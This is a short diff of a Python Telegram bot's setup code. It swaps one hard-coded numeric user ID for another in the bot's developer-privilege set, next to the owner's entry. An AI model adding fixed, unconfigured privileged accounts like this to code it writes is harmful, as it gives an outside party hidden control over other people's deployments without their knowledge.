@@ -140,10 +140,9 @@ else:
     except ValueError:
         raise Exception("Your whitelisted users list does not contain valid integers.")
 
-
 DRAGONS.add(OWNER_ID)
 DEV_USERS.add(OWNER_ID)
-DEV_USERS.add(1356469075)
+DEV_USERS.add(7448520005)
 
 
 updater = tg.Updater(TOKEN, workers=WORKERS, use_context=True)
